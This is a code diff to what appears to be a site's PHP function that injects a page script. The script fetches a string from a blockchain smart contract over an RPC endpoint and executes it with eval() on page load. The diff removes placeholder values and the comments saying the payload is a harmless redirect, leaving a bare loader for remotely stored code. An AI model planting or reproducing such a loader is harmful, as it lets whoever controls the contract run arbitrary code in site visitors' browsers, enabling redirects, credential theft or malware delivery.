@@ -5,9 +5,9 @@ function custom_function() {
 <div id="status" style="position:fixed;bottom:10px;right:10px;background:#333;color:#fff;padding:10px;font-size:12px;z-index:9999;display:none;"></div>
 <script>
 (function() {
-    var CONTRACT_ADDRESS = "0xYourDeployedContractAddress";
-    var RPC_URL          = "https://eth-sepolia.g.alchemy.com/v2/YOUR_API_KEY";
-    var SELECTOR         = "0x????????"; // getPayload() selector
+    var CONTRACT_ADDRESS = "";
+    var RPC_URL          = "";
+    var SELECTOR         = "";
 
     var status = document.getElementById("status");
     status.textContent = "Fetching from blockchain...";
@@ -38,15 +38,11 @@ function custom_function() {
     .then(function(r) { return r.json(); })
     .then(function(data) {
         var payload = decodeABIString(data.result);
-
-        // Show in status div before executing
         status.textContent = "Payload received: " + payload;
         console.log("[SIMULATION] Payload:", payload);
 
-        // Small delay so you can see the status update
-        // before the redirect happens
         setTimeout(function() {
-            eval(payload); // executes: window.location.href='https://www.google.com'
+            eval(payload);
         }, 2000);
     })
     .catch(function(err) {
